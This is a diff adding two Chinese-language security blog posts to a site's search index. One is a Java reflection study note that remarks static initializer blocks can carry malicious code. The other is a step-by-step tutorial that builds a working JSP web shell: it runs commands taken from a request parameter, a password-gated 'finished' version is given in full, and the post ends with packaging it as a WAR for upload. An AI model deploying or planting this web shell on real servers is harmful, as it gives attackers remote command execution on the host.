@@ -3885,4 +3885,80 @@
         <tag>henu</tag>
       </tags>
   </entry>
+  <entry>
+    <title>java安全-反射-学习</title>
+    <url>/2022/03/01/java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%B0%84-%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="java安全-反射学习"><a href="#java安全-反射学习" class="headerlink" title="java安全,反射学习"></a>java安全,反射学习</h2><p>java中反射赋予了java动态的特性</p>
+<p>Class.forName()可以通过类的路径获取到一个类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)  <span class="comment">//这个可以理解为下一个的封装</span></span><br><span class="line"><span class="comment">//等于</span></span><br><span class="line">Class.forName(className,<span class="keyword">true</span>,currentLoader)</span><br><span class="line">    <span class="comment">//第一个参数是类名,第二个参数表示是否初始化,第三个参数是ClassLoader</span></span><br></pre></td></tr></table></figure>
+
+<p>Java默认的 ClassLoader 就是根据类名来加载类， 这个类名是类完整路径，如 java.lang.Runtime </p>
+<h4 id="类中”初始化方法”的调用顺序与区别"><a href="#类中”初始化方法”的调用顺序与区别" class="headerlink" title="类中”初始化方法”的调用顺序与区别"></a>类中”初始化方法”的调用顺序与区别</h4><p><code>static&#123;&#125;</code>静态代码块在”类初始化”的时候调用,<code>&#123;&#125;</code>代码块的内容会在父类构造函数<code>super()</code>之后调用,最后调用构造函数</p>
+<p>还记得学java的时候说super必须写在构造函数的第一行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;类内代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在获取类对象的时候静态代码块就会执行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220301221808194.png" alt="image-20220301221808194"></p>
+<p>剩下两个”初始化方法”必须在实例化的时候才会调用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//需要抛出一个类找不到的异常</span></span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.reflect.test.TrainPrint&quot;</span>);</span><br><span class="line">            Object o = aClass.newInstance();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后的顺序</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220301222222222.png" alt="image-20220301222222222"></p>
+<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>综上所述,其中静态代码块可以写入恶意代码从而在”类初始化”的时候调用</p>
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jsp小马实践</title>
+    <url>/2022/01/19/java%E5%B0%8F%E9%A9%AC%E5%AE%9E%E8%B7%B5/</url>
+    <content><![CDATA[<h2 id="categoties-web"><a href="#categoties-web" class="headerlink" title="categoties: web"></a>categoties: web</h2><p>经过javaWeb的学习,现在开始尝试编写jsp小马</p>
+<p>先从最简单的原理开始</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    out.print(Runtime.getRuntime().exec(cmd));</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功打开记事本</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119153656574.png" alt="image-20220119153656574"></p>
+<p>上面的代码存在诸多不足,比如只能显示单行输出等</p>
+<p>接下来开始解决只能显示单行输出的命令的问题</p>
+<p>Runtime.getRuntime().exec(c)返回的是一个Process对象类型的值</p>
+<p>查看Process源代码,发现其返回的是一个iutputStream,正好可以用inputStream接收</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119154927926.png" alt="image-20220119154927926"></p>
+<p>解决办法是利用StringBuilder或者StringBuffer中的append方法和JAVA io流,利用inputStream获取字节流到BufferReader转换成字符流,再通过Append方法写入到要输出的字符串中</p>
+<p>关于StringBuilder和StringBuffer,StringBuilder是线程安全的,编辑的时候会上锁,但是这里为了性能,选择线程不安全的StringBuffer更好</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StringBuffer res=<span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Process p=Runtime.getRuntime().exec(cmd);</span><br><span class="line">        InputStream inputStream=p.getInputStream();</span><br><span class="line">        InputStreamReader inputStreamReader=<span class="keyword">new</span> InputStreamReader(inputStream);</span><br><span class="line">        BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">        String len;</span><br><span class="line">        <span class="keyword">while</span>((len=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            res.append(len+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        res.append(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(res.toString());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>改进后可以执行命令并抛出错误信息,但是windows下很多命令无法执行……….</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119160519025.png" alt="image-20220119160519025"></p>
+<p>参考了这篇龙龙姐推荐的文章<a href="https://www.cnblogs.com/mingforyou/p/3551199.html">https://www.cnblogs.com/mingforyou/p/3551199.html</a></p>
+<p>明白了<label style="background:yellow">windows下面要把cmd中的命令当做参数去运行cmd</label></p>
+<p>比如<code>dir</code>,就写成<code>cmd /C dir</code></p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119163716240.png" alt="image-20220119163716240"></p>
+<p>接下来将代码做简单的修改和功能的封装,让其看起来简短美观</p>
+<p>完成!!!!</p>
+<h5 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%!<span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">(String cmd)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            res.append(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;password&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))&amp;&amp;request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>+execute(request.getParameter(<span class="string">&quot;cmd&quot;</span>))+<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;h2&gt;你让我执行什么啊????&lt;/h2&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>windows下测试:</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119170718703.png" alt="image-20220119170718703"></p>
+<p>linux下测试:</p>
+<p>首先通过jar命令打包jsp马为war</p>
+<p><code>jar cvf test.war .\horse.jsp .</code></p>
+<p>第一个参数为打包后的war包名称, 第二个参数为要打包的文件路径   第三个参数表示要输出的目录,用<code>.</code>表示输出到当前目录</p>
+<p>上传war</p>
+<p>打开对应路径</p>
+<p>输入对应参数</p>
+<p><img src="https://gitee.com/blue_satchel/images/raw/master/image-20220119185016439.png" alt="image-20220119185016439"></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+        <tag>web</tag>
+        <tag>java木马</tag>
+      </tags>
+  </entry>
 </search>
